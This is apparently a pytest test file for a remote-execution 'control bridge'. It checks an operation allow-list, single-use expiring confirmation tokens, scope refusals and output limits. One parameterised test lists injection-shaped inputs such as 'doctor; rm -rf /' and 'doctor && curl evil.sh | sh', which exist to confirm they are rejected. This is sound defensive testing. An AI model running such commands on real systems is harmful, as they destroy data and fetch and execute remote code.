"""Tests for the control bridge — a remote-execution surface, so tested as one.

The assertions that matter are the refusals. An executor tested only on its happy path is an
executor whose safety properties are unverified, and this one can uninstall the owner's backend.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from emubackend import control
from emubackend.control import BridgeError, ControlBridge

REPO = Path(__file__).resolve().parent.parent.parent
SWIFT = REPO / "ios" / "App" / "Operations.swift"


def _bridge(**kw):
    calls: list[list[str]] = []

    def runner(argv, timeout):
        calls.append(argv)
        return {"returncode": 0, "stdout": "ok", "stderr": ""}

    return ControlBridge(runner=runner, **kw), calls


# ======================================================================================
# the allow-list is closed
# ======================================================================================


def test_an_unknown_operation_cannot_become_a_command():
    """The whole defence: an id off the wire that is not in the registry resolves to nothing."""
    with pytest.raises(BridgeError) as exc:
        control.argv_for("rm-rf-slash")
    assert "closed allow-list" in str(exc.value)


def test_argv_is_built_from_the_registry_not_from_the_input():
    assert control.argv_for("doctor") == ["superresearch", "--doctor"]
    assert control.argv_for("doctor", executable="/opt/sr") == ["/opt/sr", "--doctor"]


@pytest.mark.parametrize(
    "hostile",
    [
        "doctor; rm -rf /",
        "doctor && curl evil.sh | sh",
        "--doctor",
        "doctor\nuninstall",
        "../../bin/sh",
        "",
    ],
)
def test_injection_shaped_ids_are_refused(hostile):
    """None of these are registry keys, so none of them resolve. Parameterised because "it is a

    closed enum" is only reassuring if the obvious attempts are shown to bounce.
    """
    with pytest.raises(BridgeError):
        control.argv_for(hostile)


def test_no_argv_entry_contains_a_shell_metacharacter():
    """Belt and braces: even the trusted table must not carry anything a shell would interpret,

    in case a future caller reintroduces shell=True somewhere.
    """
    for op in control.OPERATIONS.values():
        for part in op.argv:
            assert not any(c in part for c in ";|&$`><\n"), f"{op.id}: {part!r}"


def test_the_bridge_never_uses_a_shell():
    src = Path(control.__file__).read_text()
    assert "shell=False" in src
    assert "shell=True" not in src


# ======================================================================================
# scope
# ======================================================================================


def test_the_bridge_refuses_device_scoped_operations():
    """The phone does those against Firestore itself; relaying them would duplicate the action."""
    bridge, _ = _bridge()
    with pytest.raises(BridgeError, match="device-scoped"):
        bridge.execute("pair")


def test_a_safe_daemon_operation_runs_without_confirmation():
    bridge, calls = _bridge()
    record = bridge.execute("doctor")
    assert calls == [["superresearch", "--doctor"]]
    assert record["exit"] == 0


# ======================================================================================
# confirmation tokens — the defence against a replayed or forged document
# ======================================================================================


@pytest.mark.parametrize("op_id", ["uninstall", "clear", "unpair", "retire", "restart", "update"])
def test_every_risky_operation_needs_a_token(op_id):
    bridge, calls = _bridge()
    if control.OPERATIONS[op_id].scope != "daemon":
        pytest.skip("device-scoped; covered by the scope test")
    with pytest.raises(BridgeError, match="confirmation token"):
        bridge.execute(op_id)
    assert calls == [], "nothing may run without one"


def test_a_matching_token_permits_the_operation():
    bridge, calls = _bridge()
    token = bridge.issue_confirmation("uninstall", now=1000)
    bridge.execute("uninstall", confirmation=token, now=1001)
    assert calls == [["superresearch", "--uninstall"]]


def test_a_token_is_single_use():
    """A reused token would let one confirmation authorise a second, unconfirmed action."""
    bridge, calls = _bridge()
    token = bridge.issue_confirmation("clear", now=1000)
    bridge.execute("clear", confirmation=token, now=1001)
    with pytest.raises(BridgeError, match="none was issued"):
        bridge.execute("clear", confirmation=token, now=1002)
    assert len(calls) == 1


def test_a_stale_token_is_refused():
    """So a delayed replay cannot act on a decision the user made minutes ago."""
    bridge, calls = _bridge(token_ttl=60)
    token = bridge.issue_confirmation("uninstall", now=1000)
    with pytest.raises(BridgeError, match="expired"):
        bridge.execute("uninstall", confirmation=token, now=1200)
    assert calls == []


def test_a_wrong_token_is_refused_and_consumes_the_issued_one():
    """Popped whether or not it matches, so guessing cannot be retried against a live token."""
    bridge, calls = _bridge()
    bridge.issue_confirmation("uninstall", now=1000)
    with pytest.raises(BridgeError, match="does not match"):
        bridge.execute("uninstall", confirmation="wrong", now=1001)
    with pytest.raises(BridgeError, match="none was issued"):
        bridge.execute("uninstall", confirmation="wrong-again", now=1002)
    assert calls == []


def test_a_token_cannot_be_issued_for_an_unknown_operation():
    bridge, _ = _bridge()
    with pytest.raises(BridgeError, match="unknown operation"):
        bridge.issue_confirmation("nope")


# ======================================================================================
# failures are data
# ======================================================================================


def test_a_failing_command_is_reported_not_raised():
    """The phone needs the exit code and output either way; a traceback loses both."""
    def runner(argv, timeout):
        return {"returncode": 2, "stdout": "", "stderr": "boom"}

    bridge = ControlBridge(runner=runner)
    record = bridge.execute("doctor")
    assert record["exit"] == 2
    assert record["stderr"] == "boom"


def test_a_missing_executable_explains_itself():
    bridge = ControlBridge(executable="definitely-not-installed-xyz")
    record = bridge.execute("version")
    assert record["exit"] == 127
    assert "not on PATH" in record["stderr"]
    assert "does not contain a copy" in record["stderr"]


def test_output_is_truncated_so_one_command_cannot_flood_the_channel():
    def runner(argv, timeout):
        return {"returncode": 0, "stdout": "x" * 100_000, "stderr": ""}

    record = ControlBridge(runner=runner).execute("collect")
    assert len(record["stdout"]) <= 4000


def test_every_execution_is_logged():
    bridge, _ = _bridge()
    bridge.execute("doctor")
    bridge.execute("version")
    assert [r["op"] for r in bridge.log] == ["doctor", "version"]


# ======================================================================================
# cross-language drift
# ======================================================================================


def test_the_swift_and_python_registries_agree():
    """Two hand-maintained copies of a security-relevant allow-list in different languages drift.

    A drift means the app offers an operation the bridge refuses, or the bridge accepts one the app
    never shows — so it is made a test failure rather than left to discipline.
    """
    swift_ids = control.swift_registry_ids(SWIFT)
    python_ids = set(control.OPERATIONS)
    assert swift_ids, "parsed no ids from Operations.swift — did its shape change?"
    assert swift_ids == python_ids, (
        f"registries diverged.\n  only in Swift: {sorted(swift_ids - python_ids)}"
        f"\n  only in Python: {sorted(python_ids - swift_ids)}"
    )


def test_the_registry_covers_the_operations_the_owner_named():
    """pair / unpair / resurrect were named explicitly; the rest came from the real CLI."""
    for named in ("pair", "unpair", "resurrect", "retire", "restart", "doctor", "login"):
        assert named in control.OPERATIONS


def test_destructive_operations_are_labelled_as_such():
    """Risk drives the confirmation gate, so a mislabelled op is a missing gate."""
    for op_id in ("uninstall", "clear", "unpair", "retire"):
        assert control.OPERATIONS[op_id].risk == "destructive"
    assert control.OPERATIONS["doctor"].risk == "safe"
